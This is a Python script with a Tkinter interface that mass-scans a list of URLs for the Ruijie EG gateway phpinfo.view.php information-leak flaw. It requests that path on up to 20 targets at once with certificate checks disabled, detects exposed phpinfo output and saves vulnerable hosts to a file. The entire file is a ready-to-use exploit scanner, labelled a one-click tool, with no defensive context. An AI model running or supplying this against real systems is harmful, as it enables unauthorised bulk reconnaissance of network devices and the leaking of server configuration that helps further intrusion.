import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def ruijie_phpinfo_leak_exp(url):
    poc = r"""/tool/view/phpinfo.view.php"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "PHP License" in res.text:
            ruijie_phpinfo_leak_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            ruijie_phpinfo_leak_text.see(END)
            with open ("存在锐捷EG易网关 phpinfo.view.php 信息泄露漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            ruijie_phpinfo_leak_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            ruijie_phpinfo_leak_text.see(END)
    except Exception as err:
        ruijie_phpinfo_leak_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        ruijie_phpinfo_leak_text.see(END)
def get_ruijie_phpinfo_leak_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def ruijie_phpinfo_leak_gui():
    ruijie_phpinfo_leak = tk.Tk()
    ruijie_phpinfo_leak.geometry("910x450")
    ruijie_phpinfo_leak.title("锐捷EG易网关 phpinfo.view.php 信息泄露漏洞一把梭")
    ruijie_phpinfo_leak.resizable(0, 0)
    ruijie_phpinfo_leak.iconbitmap('logo.ico')
    global ruijie_phpinfo_leak_text
    ruijie_phpinfo_leak_text = scrolledtext.ScrolledText(ruijie_phpinfo_leak,width=123, height=25)
    ruijie_phpinfo_leak_text.grid(row=0, column=0, padx=10, pady=10)
    ruijie_phpinfo_leak_text.see(END)
    addrs = get_ruijie_phpinfo_leak_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(ruijie_phpinfo_leak_exp, addr)
    ruijie_phpinfo_leak.mainloop()